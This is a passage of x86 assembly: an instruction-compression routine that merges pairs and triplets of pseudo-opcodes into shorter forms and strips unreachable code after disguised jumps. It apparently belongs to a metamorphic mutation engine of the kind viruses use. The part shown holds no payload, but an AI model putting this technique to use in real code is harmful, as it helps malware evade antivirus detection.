                mov     eax, 50h       ; MOV Mem,Reg/PUSH Mem = PUSH Reg
                jmp   @@Double_Next_SetInstruction

      @@Double_Next03:
                ;mov     al, [esi]
                cmp     eax, 0C3h   ; Check pair beginning with MOV Mem8,Reg8
                jnz   @@Double_Next04
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 00h+80h  ; Check if it's a normal operation
                jb    @@Double_End    ; (pseudo-opcodes 80-CC)
                cmp     eax, 4Ch+80h
                jbe   @@Double_Next_OPRegReg
                jmp   @@Double_End

      @@Double_Next04:
                cmp     eax, 44h    ; Check if it begins with MOV Mem,Imm
                jnz   @@Double_Next05
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 51h    ; PUSH Mem?
                jz    @@Double_Next04_PushImm ; Set PUSH Imm
                cmp     eax, 4Ch
                ja    @@Double_Next05
                and     eax, 7
                cmp     eax, 2         ; OP Reg,Mem?
                jnz   @@Double_Next05  ; If not, check next pair
        @@Double_Next_Merge_MOV_OP:
                mov     eax, [edi+7]
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, ebx
                mov     [esi+1], eax
                mov     eax, [edi]
                and     eax, 0F8h   ; MOV Mem,Imm + OP Reg,Mem = OP Reg,Imm
                jmp   @@Double_Next_SetInstruction
        @@Double_Next04_PushImm:
                mov     eax, 68h    ; MOV Mem,Imm + PUSH Mem = PUSH Imm
                jmp   @@Double_Next_SetInstruction

      @@Double_Next05:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 44h+80h  ; Same as above, but 8 bits operations
                jnz   @@Double_Next06
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 00h+80h
                jb    @@Double_Next06
                cmp     eax, 4Ch+80h
                ja    @@Double_Next06
                and     eax, 7
                cmp     eax, 2
                jnz   @@Double_Next06
                jmp   @@Double_Next_Merge_MOV_OP

      @@Double_Next06:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 59h     ; POP Mem?
                jnz   @@Double_Next_NoMem
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 42h     ; POP Mem + MOV Reg,Mem?
                jz    @@Double_Next06_POPReg
                cmp     eax, 4Fh     ; POP Mem + MOV Mem,Mem?
                jz    @@Double_Next06_POPMem
                cmp     eax, 51h     ; POP Mem + PUSH Mem?
                jz    @@Double_Next_SetDoubleNOP
                cmp     eax, 0EBh    ; POP Mem + JMP Mem?
                jnz   @@Double_Next_NoMem
                mov     eax, 0FEh    ; POP Mem + JMP Mem = RET
                jmp   @@Double_Next_SetInstruction
        @@Double_Next06_POPReg:
                mov     eax, [edi+7]
                mov     [esi+1], eax
                mov     eax, 58h     ; POP Mem + MOV Reg,Mem = POP Reg
                jmp   @@Double_Next_SetInstruction
        @@Double_Next06_POPMem:
                mov     ebx, [edi+7]
                mov     eax, [ebx+1]
                mov     [esi+1], eax
                mov     eax, [ebx+3]
                mov     [esi+3], eax ; POP Mem + MOV Mem2,Mem = POP Mem2
                jmp   @@Double_Next_SetNOP
        @@Double_Next_SetDoubleNOP:
                mov     eax, 0FFh    ; POP Mem + PUSH Mem = NOP
                jmp   @@Double_Next_SetInstruction


      @@Double_Next_NoMem:

                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 40h       ; MOV Reg,Imm?
                jnz   @@Double_Next07
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 42h+80h   ; MOV Reg,Imm + MOV Reg8,Mem8?
                jz    @@Double_Next06_MaybeMOVZX
                cmp     eax, 1         ; MOV Reg,Imm + ADD Reg,Reg?
                jnz   @@Double_Next07
                mov     eax, [esi+1]   ; MOV Reg,Imm + ADD Reg,Reg2 =
                and     eax, 0FFh      ; = LEA Reg,[Reg2+Imm]
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next07
                mov     eax, [esi+7]
                mov     [esi+3], eax
                mov     eax, [esi+1]
                mov     [esi+7], eax
                mov     eax, [edi+1]
                and     eax, 0FFh
                mov     ebx, [esi+1]
                and     ebx, 0FFFFFF00h
                add     eax, ebx
                mov     [esi+1], eax
        @@Double_Next06_SetLEA:
                mov     eax, [esi+2]
                and     eax, 0FFFFFF00h
                add     eax, 8
                mov     [esi+2], eax
                mov     eax, 0FCh
                jmp   @@Double_Next_SetInstruction
      @@Double_Next06_MaybeMOVZX:
                mov     eax, [esi+7]
                or      eax, eax
                jnz   @@Double_Next07
                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next07
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jz    @@Double_Next07
                mov     ebx, [edi+2]
                and     ebx, 0Fh
                cmp     eax, ebx
                jz    @@Double_Next07
                mov     [esi+7], eax
                mov     eax, [edi+1]
                mov     [esi+1], eax
                mov     eax, [edi+3]
                mov     [esi+3], eax
                mov     eax, 0F8h   ; MOV Reg,0+MOV Reg8,Mem8=MOVZX Reg,Mem8
                jmp   @@Double_Next_SetInstruction

      @@Double_Next07:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 41h    ; MOV Reg,Reg?
                jnz   @@Double_Next08
                mov     eax, [edi]
                and     eax, 0FFh
                or      eax, eax    ; MOV Reg,Reg + ADD Reg,Imm?
                jz    @@Double_Next07_LEA01
                cmp     eax, 1      ; MOV Reg,Reg + ADD Reg,Reg?
                jnz   @@Double_Next08
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next08
                mov     eax, [edi+1]
                mov     [esi+2], eax
                xor     eax, eax
                mov     [esi+3], eax    ; MOV Reg,Reg2 + ADD Reg,Reg3 =
                mov     eax, 0FCh       ; = LEA Reg,[Reg2+Reg3]
                jmp   @@Double_Next_SetInstruction
        @@Double_Next07_LEA01:
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next08
                mov     eax, [edi+7]  ; MOV Reg,Reg2 + ADD Reg,Imm =
                mov     [esi+3], eax  ; = LEA Reg,[Reg2+Imm]
                jmp   @@Double_Next06_SetLEA

      @@Double_Next08:
                mov     eax, [esi]
                and     eax, 0FFh
                or      eax, eax      ; ADD Reg,Imm?
                jnz   @@Double_Next09
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 01h      ; ADD Reg,Imm + ADD Reg,Reg2?
                jnz   @@Double_Next09
                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next09
                mov     eax, [edi+1]
                mov     [esi+2], eax
                mov     eax, [esi+7]
                mov     [esi+3], eax
                mov     eax, [esi+1]
                mov     [esi+7], eax
                mov     eax, 0FCh     ; Merge to LEA
                jmp   @@Double_Next_SetInstruction

      @@Double_Next09:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 01h      ; ADD Reg,Reg?
                jnz   @@Double_Next10
                mov     eax, [edi]
                and     eax, 0FFh
                or      eax, eax      ; ADD Reg,Imm?
                jnz   @@Double_Next10
                mov     eax, [esi+7]
                cmp     al, [edi+1]
                jnz   @@Double_Next10
                mov     eax, [esi+1]
                mov     [esi+2], al
                mov     eax, [esi+7]
                mov     [esi+1], al
                mov     eax, [edi+7]
                mov     [esi+3], eax
                mov     eax, 0FCh     ; Merge to LEA
                jmp   @@Double_Next_SetInstruction

      @@Double_Next10:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 4Ch      ; Generic OP?
                ja    @@Double_Next11
                mov     al, [edi]
                cmp     eax, 4Ch      ; Generic OP + Generic OP?
                ja    @@Double_Next11
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 4        ; OP Mem,Imm + Generic OP?
                jz    @@Double_Next10_OPMemImm
                or      eax, eax      ; OP Reg,Imm + Generic OP?
                jnz   @@Double_Next11
        @@Double_Next10_OPRegImm:
                mov     eax, [edi]
                and     eax, 7
                or      eax, eax      ; OP Reg,Imm + OP Reg,Imm?
                jnz   @@Double_Next11
                mov     eax, [esi+1]
                cmp     al, [edi+1]   ; 1st Reg == 2nd Reg?
                jnz   @@Double_Next11
                xor     ebx, ebx
        @@Double_Next_CalculateOperation:
                push    ebx
                mov     ecx, [esi+7]
                mov     edx, [edi+7]
        @@Double_Next_CalculateOperation_2:
                mov     eax, [edi]
                and     eax, 78h      ; Get 2nd OP
                mov     ebx, eax
                mov     eax, [esi]
                and     eax, 78h      ; Get 1st OP
                call    CalculateOperation ; Merge the operations
                pop     ebx
                cmp     eax, 0FEh     ; Can be merged?
                jz    @@Double_End    ; If not, check triplet
                cmp     eax, 0FFh     ; OP Reg,Imm + MOV Reg,Imm?
                jz    @@Double_Next_SetNOPAt1st ; Then, eliminate first
                mov     [esi+7], ecx
                add     eax, ebx      ; Set merged operation
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_SetNOPAt1st:
                mov     eax, 0FFh     ; Set NOP at first instruction
                mov     [esi], al
                jmp   @@EndCompressed ; Return with success
        @@Double_Next10_OPMemImm:
                mov     eax, [edi]
                and     eax, 7
                cmp     eax, 4        ; OP Mem,Imm + OP Mem,Imm?
                jnz   @@Double_Next11
                mov     eax, [esi+1]
                cmp     eax, [edi+1]  ; Are mem operands the same?
                jnz   @@Double_Next11
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next11
                mov     ebx, 4        ; If so, jump to try merging OPs
                jmp   @@Double_Next_CalculateOperation

      @@Double_Next11:
                xor     eax, eax
                mov     al, [esi]     ; Do the same as above, but with
                cmp     eax, 00h+80h  ; 8 bits operations
                jb    @@Double_Next12
                cmp     eax, 4Ch+80h
                ja    @@Double_Next12
                mov     al, [edi]
                cmp     eax, 00h+80h
                jb    @@Double_Next12
                cmp     eax, 4Ch+80h
                ja    @@Double_Next12
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 4
                jz    @@Double_Next11_OPMemImm_8b
                or      eax, eax
                jnz   @@Double_Next12
        @@Double_Next11_OPRegImm_8b:
                mov     eax, [edi]
                and     eax, 7
                or      eax, eax
                jnz   @@Double_Next12
                mov     ebx, 80h
        @@Double_Next11_CalculateOperation_8b:
                push    ebx
                xor     eax, eax
                mov     al, [esi+7]
                mov     ecx, eax
                mov     al, [edi+7]
                mov     edx, eax
                jmp   @@Double_Next_CalculateOperation_2
        @@Double_Next11_OPMemImm_8b:
                mov     eax, [edi]
                and     eax, 7
                cmp     eax, 4
                jnz   @@Double_Next12
                mov     eax, [esi+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next12
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next12
                mov     ebx, 84h
                jmp   @@Double_Next11_CalculateOperation_8b

      @@Double_Next12:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 0FCh     ; LEA?
                jnz   @@Double_Next13
                mov     al, [edi]
                cmp     eax, 01h      ; LEA + ADD Reg,Reg?
                jz    @@Double_Next12_MergeLEAADDReg
                or      eax, eax      ; LEA + ADD Reg,Imm?
                jnz   @@Double_Next13
        @@Double_Next12_MergeLEAADD:
                mov     eax, [esi+7]  ; Check if destiny in LEA is the same
                cmp     al, [edi+1]   ; as destiny in ADD
                jnz   @@Double_Next13
                mov     eax, [edi+7]  ; If so, add the Imm of the ADD to the
                add     [esi+3], eax  ; dword addition in the LEA and set
                jmp   @@Double_Next_SetNOP ; NOP at first instruction
        @@Double_Next12_MergeLEAADDReg:
                mov     eax, [esi+7]
                cmp     al, [edi+7]   ; Check if destinies are the same
                jnz   @@Double_Next13
                mov     eax, 8
                cmp     al, [esi+1]   ; Look for a free space to insert the
                jz    @@Double_Next12_SetFirstReg ; register addition in the
                cmp     al, [esi+2]               ; LEA
                jz    @@Double_Next12_SetSecondReg
                mov     eax, [edi+1]  ; If the register is already inserted,
                cmp     al, [esi+2]   ;  set a *2 in the multiplicator
                jz    @@Double_Next12_AddScalar
                cmp     al, [esi+1]
                jnz   @@Double_Next13
                mov     eax, [esi+2]
                cmp     al, 40h       ; If multiplicator is already *2 or
                jae   @@Double_Next13 ;  greater, don't shrink
                push    eax           ; Exchange registers, to set the one
                mov     eax, [esi+1]  ;  repeated in the second slot of the
                add     eax, 40h      ;  indexes.
                mov     [esi+2], al   ; Set *2
                pop     eax
                mov     [esi+1], al
                jmp   @@Double_Next_SetNOP ; Eliminate first instruction
        @@Double_Next12_AddScalar:
                mov     eax, [esi+2]  ; Set *2 to the second index
                add     eax, 40h
                mov     [esi+2], al
                jmp   @@Double_Next_SetNOP
        @@Double_Next12_SetFirstReg:
                mov     eax, [edi+1] ; Set a new index register
                mov     [esi+1], al
                jmp   @@Double_Next_SetNOP
        @@Double_Next12_SetSecondReg:
                mov     eax, [edi+1] ; Set a new second index register
                mov     [esi+2], al
                jmp   @@Double_Next_SetNOP

      @@Double_Next13:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 4Fh     ; MOV Mem,Mem?
                jnz   @@Double_Next14
                mov     al, [edi]
                cmp     eax, 4Fh     ; MOV Mem,Mem2 + MOV Mem2,Mem3?
                jz    @@Double_Next13_MergeMOVs ; Then, merge them
                cmp     eax, 4Ch
                ja    @@Double_Next13_NotOPRegMem
        @@Double_Next13_OPRegMem_2:
                and     eax, 7
                cmp     eax, 2       ; MOV Mem,Mem2 + OP Reg,Mem?
                jz    @@Double_Next13_OPRegMem
                mov     al, [edi]
                jmp   @@Double_Next13_NotOPRegMem2
        @@Double_Next13_NotOPRegMem:
                cmp     eax, 00h+80h ; Same with 8 bits?
                jb    @@Double_Next13_NotOPRegMem2
                cmp     eax, 4Ch+80h
                jbe   @@Double_Next13_OPRegMem_2
        @@Double_Next13_NotOPRegMem2:
                cmp     eax, 43h     ; Merge MOVs
                jz    @@Double_Next13_MOVMemReg
                cmp     eax, 0F6h    ; APICALL_STORE = MOV Mem,EAX
                jz    @@Double_Next13_MOVMemReg
                cmp     eax, 44h     ; MOV Mem,Mem2 + MOV Mem2,Imm?
                jz    @@Double_Next13_MOVMemImm
                cmp     eax, 0EAh    ; MOV Mem,Mem2 + CALL Mem?
                jz    @@Double_Next13_CALLMem
                cmp     eax, 0EBh    ; MOV Mem,Mem2 + JMP Mem?
                jnz   @@Double_Next14
        @@Double_Next13_JMPMem:
        @@Double_Next13_CALLMem:
        @@Double_Next13_OPRegMem:
                mov     ebx, [esi+7]  ; Merge Mem operands
                mov     eax, [ebx+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next14
                mov     eax, [esi+1]
                mov     [edi+1], eax
                mov     eax, [esi+3]
                mov     [edi+3], eax
                jmp   @@Double_Next_SetNOPAt1st
        @@Double_Next13_MergeMOVs:
                mov     ebx, [esi+7] ; MOV Mem,Mem2 + MOV Mem2,Mem3 =
                mov     eax, [ebx+1] ; = MOV Mem,Mem3
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next14
                mov     eax, [edi+7]
                mov     [esi+7], eax
                mov     [eax+7], esi
                jmp   @@Double_Next_SetNOP
        @@Double_Next13_MOVMemReg:
        @@Double_Next13_MOVMemImm:
                mov     ebx, [esi+7]  ; MOV Mem,Mem2 + MOV Mem2,Reg/Imm =
                mov     eax, [ebx+1]  ; = MOV Mem,Reg/Imm
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jz    @@Double_Next_SetNOPAt1st

      @@Double_Next14:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 70h     ; Jcc?
                jb    @@Double_Next15
                cmp     eax, 7Fh
                ja    @@Double_Next15
                mov     al, [edi]
                cmp     eax, 0E9h    ; Jcc + JMP?
                jz    @@Double_Next14_CheckJMP
                cmp     eax, 70h
                jb    @@Double_Next15
                cmp     eax, 7Fh     ; Jcc + Jcc?
                ja    @@Double_Next15
                mov     eax, [edi+1] ; Check if they point to the next
                cmp     eax, [esi+1] ; label
                jnz   @@Double_Next15
                mov     eax, [esi]
                and     eax, 0Fh
                mov     ebx, eax
                mov     eax, [edi]
                and     eax, 0Fh
                ; EAX = Flag test 1
                ; EBX = Flag test 2
                call    GetRealCheck ; Merge the flag checking
                cmp     eax, 0FFh
                jz    @@Double_End
                add     eax, 70h     ; Add 70 to the result
                cmp     eax, 0E9h    ; If Jcc + Jcc == JMP, set it, and jump
                jz    @@Double_Next32_JMP ; to eliminate the code until the
                                          ; next label
                jmp   @@Double_Next_SetInstruction
      @@Double_Next14_CheckJMP:
                mov     eax, [edi+1] ; Jcc @123 + JMP @123 = JMP @123
                cmp     eax, [esi+1]
                jz    @@Double_Next_SetNOPAt1st
                jmp   @@Double_End

      @@Double_Next15:
;                 mov     edx, 40h
;                 call    Check_OP_MOV
;                 cmp     eax, 0FFh               ; This makes many problems!
;                 jz    @@Double_Next_SetNOPAt1st ;
                                                  ; Disabled.
      @@Double_Next16:
;                 mov     edx, 0C0h
;                 call    Check_OP_MOV
;                 cmp     eax, 0FFh
;                 jz    @@Double_Next_SetNOPAt1st

      @@Double_Next17:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 0E0h    ; NOT Reg?
                jnz   @@Double_Next18
                mov     ebx, 0E4h    ; NOT Reg + NEG Reg?
                xor     ecx, ecx
                mov     edx, 1       ; Set ADD Reg,1
        @@Double_Next_Check_NOT_OP:
                xor     eax, eax
                mov     al, [edi]
                cmp     eax, ebx ; 0E4h
                jz    @@Double_Next17_ADDReg ; Check NOT/NEG + ADD,1/-1
                cmp     eax, ecx ; 00h
                jnz   @@Double_End
        @@Double_Next17_NEGReg:
                mov     eax, [esi+1]
                cmp     al, [edi+1]
                jnz   @@Double_End
        @@Double_Next17_NEGReg_2:
                test    ebx, 2
                jz    @@Double_Next17_Get32
                xor     eax, eax
                mov     al, [edi+7]
                cmp     eax, 80h
                jb    @@Double_Next17_Cont00
                add     eax, 0FFFFFF00h
                jmp   @@Double_Next17_Cont00
        @@Double_Next17_Get32:
                mov     eax, [edi+7]
        @@Double_Next17_Cont00:
                cmp     eax, edx
                jnz   @@Double_End
                mov     eax, ebx  ; NEG
                jmp   @@Double_Next_SetInstruction
        @@Double_Next17_ADDReg:
                mov     eax, [esi+1]
                cmp     al, [edi+1]
                jnz   @@Double_End
        @@Double_Next17_ADDReg_2:
                mov     eax, edx
                mov     [esi+7], eax
                mov     eax, ecx
                jmp   @@Double_Next_SetInstruction

      @@Double_Next18:
                ;mov     al, [esi]
                cmp     eax, 0E2h  ; Check NOT Reg8 + NEG Reg8/ADD Reg8,1
                jnz   @@Double_Next19
                mov     ebx, 0E6h
                mov     ecx, 80h
                mov     edx, 1     ; If so, set ADD Reg8,1/NEG Reg8
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next19:
                ;mov     al, [esi]
                cmp     eax, 0E4h  ; NEG Reg + NOT Reg/ADD Reg,-1?
                jnz   @@Double_Next20
                mov     ebx, 0E0h
                xor     ecx, ecx
                mov     edx, -1    ; If so, set ADD Reg,-1/NOT Reg
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next20:
                ;mov     al, [esi]
                cmp     eax, 0E6h  ; NEG Reg8 + NOT Reg8/ADD Reg8,-1?
                jnz   @@Double_Next21
                mov     ebx, 0E2h
                mov     ecx, 80h
                mov     edx, -1    ; Set ADD Reg8,-1/NOT Reg8
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next21:
                cmp     eax, 0E1h  ; NOT Mem + NEG Mem/ADD Mem,1?
                jnz   @@Double_Next22
                mov     ebx, 0E5h
                mov     ecx, 4
                mov     edx, 1     ; Then, set ADD Mem,1/NEG Mem
        @@Double_Next_Check_NOT_OP_Mem:
                xor     eax, eax
                mov     al, [edi]
                cmp     eax, ebx
                jz    @@Double_Next21_ADDMem
                cmp     eax, ecx
                jnz   @@Double_End
        @@Double_Next21_NEGMem:
                mov     eax, [esi+1] ; Check if operands are the same
                cmp     eax, [edi+1]
                jnz   @@Double_End
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_End
                xor     eax, eax
                jmp   @@Double_Next17_NEGReg_2
        @@Double_Next21_ADDMem:
                mov     eax, [esi+1]  ; Check NOT/NEG + ADD,1/-1
                cmp     eax, [edi+1]
                jnz   @@Double_End
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_End
                xor     eax, eax
                jmp   @@Double_Next17_ADDReg_2

      @@Double_Next22:
                cmp     eax, 0E3h     ; NOT Mem8 + NEG Mem8/ADD Mem,1?
                jnz   @@Double_Next23
                mov     ebx, 0E7h
                mov     ecx, 84h
                mov     edx, 1        ; Set ADD Mem8,1/NEG Mem8
                jmp   @@Double_Next_Check_NOT_OP_Mem

      @@Double_Next23:
                cmp     eax, 0E5h     ; NEG Mem + NOT Mem/ADD Mem,-1?
                jnz   @@Double_Next24
                mov     ebx, 0E1h
                mov     ecx, 4
                mov     edx, -1       ; Set ADD Mem,-1/NOT Mem
                jmp   @@Double_Next_Check_NOT_OP_Mem

      @@Double_Next24:
                cmp     eax, 0E7h     ; NEG Mem8 + NOT Mem8/ADD Mem8,-1?
                jnz   @@Double_Next25
                mov     ebx, 0E3h
                mov     ecx, 84h
                mov     edx, -1       ; Set ADD Mem8,-1/NOT Mem8
                jmp   @@Double_Next_Check_NOT_OP_Mem


; Next four conditions are also disabled. They would work theorically, but they
; don't in practice :/
      @@Double_Next25:
;                 cmp     eax, 38h
;                 jb    @@Double_Next26
;                 cmp     eax, 3Ch
;                 ja    @@Double_Next26
;         @@Double_Next_CheckComparision:
;                 mov     al, [edi]
;                 cmp     eax, 70h
;                 jb    @@Double_Next_NoComparision
;                 cmp     eax, 7Fh
;                 jbe   @@Double_End
;       @@Double_Next_NoComparision:
;                 jmp   @@Double_Next_SetNOPAt1st

      @@Double_Next26:
;                 ;mov     al, [esi]
;                 cmp     eax, 38h+80h
;                 jb    @@Double_Next27
;                 cmp     eax, 3Ch+80h
;                 jbe   @@Double_Next_CheckComparision

      @@Double_Next27:
;                 ;mov     al, [esi]
;                 cmp     eax, 48h
;                 jb    @@Double_Next28
;                 cmp     eax, 4Ch
;                 jbe   @@Double_Next_CheckComparision

      @@Double_Next28:
;                 ;mov     al, [esi]
;                 cmp     eax, 48h+80h
;                 jb    @@Double_Next29
;                 cmp     eax, 4Ch+80h
;                 jbe   @@Double_Next_CheckComparision

      @@Double_Next29:
                cmp     eax, 0EAh   ; CALL Mem + MOV Mem,EAX?
                jnz   @@Double_Next30
        @@Double_Next29_CheckAPICALL_STORE:
                mov     al, [edi]
                cmp     eax, 43h
                jnz   @@Double_End
                mov     al, [edi+7] ; Check EAX
                or      eax, eax
                jnz   @@Double_End
                mov     eax, 0F6h
                mov     [edi], al   ; Set APICALL_STORE
                xor     eax, eax
                mov     [edi+7], eax  ; If we put 0 here we can treat this as
                jmp   @@EndCompressed ; an special opcode 43h (MOV Mem,Reg)

      @@Double_Next30:
                cmp     eax, 0ECh   ; Check CALL Reg + MOV Mem,EAX?
                jz    @@Double_Next29_CheckAPICALL_STORE ; Check APICALL_STORE

      @@Double_Next31:
                cmp     eax, 42h    ; MOV Reg,Mem?
                jnz   @@Double_Next32
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 20h    ; MOV Reg,Mem + AND Reg,0FF?
                jz    @@Double_Next31_MaybeMOVZX ; Set MOVZX
                mov     al, [esi+7]
                cmp     eax, 2      ; EAX,ECX,EDX? (it only uses these three)
                ja    @@Double_Next32
                cmp     al, [edi+1]
                jnz   @@Double_Next32
                mov     al, [edi]
                cmp     eax, 0ECh   ; CALL Reg?
                jnz   @@Double_Next32
                sub     eax, 2      ; MOV Reg,Mem + CALL Reg = CALL Mem
                jmp   @@Double_Next_SetInstruction
      @@Double_Next31_MaybeMOVZX:
                mov     eax, [edi+7] ; Check MOVZX. We check if the destiny
                cmp     eax, 0FFh    ; registers are the same one
                jnz   @@Double_Next32
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next32
                mov     eax, [esi+1]
                and     eax, 0FFh    ; AND Reg,0FF?
                cmp     eax, ebx
                jz    @@Double_Next32
                mov     eax, [esi+2]
                and     eax, 0Fh     ; Set the register
                cmp     eax, ebx
                jz    @@Double_Next32
                mov     eax, 0F8h    ; Set MOVZX Reg,byte ptr Mem
                jmp   @@Double_Next_SetInstruction


      @@Double_Next32:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 39h     ; CMP Reg,Reg?
                jnz   @@Double_Next33
        @@Double_Next32_Common:
                mov     al, [edi]
                cmp     eax, 70h     ; CMP Reg,Reg + Jcc @xxx?
                jb    @@Double_End
                cmp     eax, 7Fh
                ja    @@Double_End
                mov     al, [esi+1]
                mov     ebx, eax     ; If source and destiny in CMP aren't
                mov     al, [esi+7]  ; the same, it's not a camuflated JMP
                cmp     eax, ebx
                jnz   @@Double_End

                mov     eax, [edi]   ; Check flags when we jump for sure
                and     eax, 07h     ; and when the two instructions do
                cmp     eax, 1       ; nothing.
                jz    @@Double_Next32_JMP
                cmp     eax, 6
                jz    @@Double_Next32_JMP
                mov     eax, [edi]
                and     eax, 0Fh
                cmp     eax, 2
                jbe   @@Double_Next32_NOP
                cmp     eax, 4
                jbe   @@Double_Next32_JMP
                cmp     eax, 0Ah
                jz    @@Double_Next32_JMP
                cmp     eax, 0Dh
                jz    @@Double_Next32_JMP
        @@Double_Next32_NOP:
                mov     eax, 0FFh   ; Set NOP in JO,JB,JNZ,JA,JS,JNP,JL,JG
                mov     [edi], eax
                jmp   @@EndCompressed
        @@Double_Next32_JMP:
                mov     eax, 0E9h   ; Set JMP in JNO,JAE,JZ,JBE,JNS,JP,JGE,JLE
                mov     [edi], al
                mov     edx, edi
 ; After the jump, we eliminate all the instructions until the next labelled
 ; instruction. That instructions are never executed, so we NOP them to avoid
 ; its reassembly.
        @@Double_Next32_EliminateNonReachableCode:
                add     edx, 10h
                cmp     edx, [ebp+AddressOfLastInstruction]
                jae   @@EndCompressed
                mov     al, [edx+0Bh]  ; Check label mark
                or      eax, eax
                jnz   @@EndCompressed
                mov     eax, 0FFh
                mov     [edx], eax
                jmp   @@Double_Next32_EliminateNonReachableCode


      @@Double_Next33:
                cmp     eax, 39h+80h   ; Do the same with CMP Reg8,Reg8
                jz    @@Double_Next32_Common

      @@Double_End:


 ;; Here we check triplets of instructions and merge them into one.
      @@Check_Triple:
                mov     edx, esi
                mov     esi, edi
                call    IncreaseEIP
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndNoCompressed
                xor     eax, eax
                mov     al, [edi+0Bh]
                or      eax, eax
                jnz   @@EndNoCompressed ; No compress if a label is pointing
                                        ; the last instruction
                ; Check triplet in [edx],[esi],[edi]

      @@Triple_Next00:
                ;xor     eax, eax
                mov     al, [edx]
                cmp     eax, 43h       ; MOV Mem,Reg?
                jnz   @@Triple_Next01
                mov     eax, [edx+1]   ; Check mem operands
                cmp     eax, [esi+1]
                jnz   @@Triple_Next01
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_Next01
                mov     eax, [edi]
                cmp     al, 42h        ; 3rd instruction == MOV Reg,Mem?
                jz    @@Triple_Next00_Constr00
                cmp     al, 70h        ; 3rd instr. == Jcc?
                jb    @@Triple_Next01
                cmp     al, 7Fh
                ja    @@Triple_Next01
                mov     eax, [esi]
                and     eax, 0F8h      ; Get the comparision
                or      eax, eax
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 28h       ; SUB?
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 38h       ; CMP?
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 48h       ; TEST?
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 20h       ; AND?
                jnz   @@Triple_End
        @@Triple_Next00_Maybe01:
                xor     ebx, ebx
        @@Triple_Next00_CheckCMPTEST:
                mov     eax, [esi]     ; Get the operation being performed
                and     eax, 07Fh
                cmp     eax, 48h       ; If test, jump
                jb    @@Triple_Next00_CheckCMPTEST_00
                and     eax, 7
                cmp     eax, 2         ; Check if it's OP Reg,Mem
                jz    @@Triple_Next00_CMPTESTRegReg
                jmp   @@Triple_Next00_CheckCMPTEST_01
        @@Triple_Next00_CheckCMPTEST_00:
                and     eax, 7
                cmp     eax, 3         ; Check if it's OP Mem,Reg
                jz    @@Triple_Next00_CMPTESTRegReg
        @@Triple_Next00_CheckCMPTEST_01:
                cmp     eax, 4         ; Check if it's OP Mem,Imm
                jnz   @@Triple_End
        @@Triple_Next00_CMPTESTRegImm:
                mov     eax, [edx+7]
                mov     [esi+1], al    ; Set CMP/TEST Reg,Imm
              ;  xor     ebx, ebx
        @@Triple_Next00_SET_CMPTEST:
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 48h       ; Check TEST
                jz    @@Triple_Next00_SetInstruction
                cmp     eax, 20h       ; Check AND
                jz    @@Triple_Next00_Cont80
                cmp     eax, 38h       ; Check CMP
                jz    @@Triple_Next00_SetInstruction
                or      eax, eax       ; Check ADD (maybe is a conversion
                jz    @@Triple_Next00_NegateImm  ; of SUB Reg,Imm)
        @@Triple_Next00_SetCMP:
                mov     eax, 38h       ; Set CMP if it's SUB/CMP
                jmp   @@Triple_Next00_SetInstruction
        @@Triple_Next00_NegateImm:
                mov     eax, [esi+7]
